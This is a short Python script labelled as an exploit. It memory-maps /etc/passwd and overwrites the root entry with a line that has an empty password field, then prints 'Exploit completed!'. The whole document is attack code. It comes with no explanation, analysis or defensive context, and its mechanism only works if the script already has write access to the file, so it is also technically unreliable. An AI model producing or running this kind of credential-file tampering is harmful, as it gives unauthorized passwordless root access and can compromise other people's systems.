import os
import mmap

# Target file (you need to have a target file that can be overwritten, which is usually owned by root)
target_file = "/etc/passwd"  # Example: altering root user password

# Fake content to be injected
fake_content = b"root::0:0:root:/root:/bin/bash\n"

# Open the target file in read-write mode
with open(target_file, 'r+b') as f:
    # Create a memory-mapped file
    map_file = mmap.mmap(f.fileno(), length=0, access=mmap.ACCESS_WRITE)
    
    # Look for the position in the file where we can overwrite data
    # In the case of /etc/passwd, we can look for 'root'
    position = map_file.find(b'root:x:0:0:root')
    
    if position == -1:
        print("Target string not found!")
    else:
        print(f"Position found at: {position}")
        # Overwrite the memory-mapped area at the found position
        map_file[position:position + len(fake_content)] = fake_content
        print("File overwritten with fake content!")

    # Unmap and close the file
    map_file.close()

print("Exploit completed!")
